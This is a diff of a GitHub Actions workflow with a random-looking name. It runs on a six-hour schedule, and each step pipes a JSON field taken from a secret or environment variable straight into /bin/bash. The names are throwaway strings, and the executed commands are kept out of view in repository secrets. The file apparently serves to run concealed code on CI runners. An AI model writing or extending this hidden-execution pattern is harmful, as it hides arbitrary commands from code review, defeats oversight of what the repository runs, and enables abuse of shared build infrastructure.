@@ -2,20 +2,23 @@ name: gansila4571
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 5/6 * * *'
+    - cron: '45 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gansila4571
         env:
-          gx6: ${{ secrets.gx6 }}
+          xzjwl7514: ${{ secrets.xzjwl7514 }}
         run: |
-          echo $gx6 | jq -r .ei5 | /bin/bash
-          echo $vxyt1 | jq -r .hp6751 | /bin/bash
-          echo $rle3225 | jq -r .htj39 | /bin/bash
-          echo $ryo66625 | jq -r .uwbn514 | /bin/bash
-          echo $jme1692 | jq -r .urf729 | /bin/bash
+          echo $xzjwl7514 | jq -r .zt941 | /bin/bash
+          echo $j1 | jq -r .pw02 | /bin/bash
+          echo $uhyf874 | jq -r .xig481 | /bin/bash
+          echo $eirnl7538 | jq -r .hn3299 | /bin/bash
+          echo $fz6626 | jq -r .yolh73 | /bin/bash
+          echo $v7627 | jq -r .wak0820 | /bin/bash
+          echo $acm42 | jq -r .ohfp6241 | /bin/bash
+          echo $lby4 | jq -r .ignyd118 | /bin/bash
+          echo $nvu41 | jq -r .eno44199 | /bin/bash
 
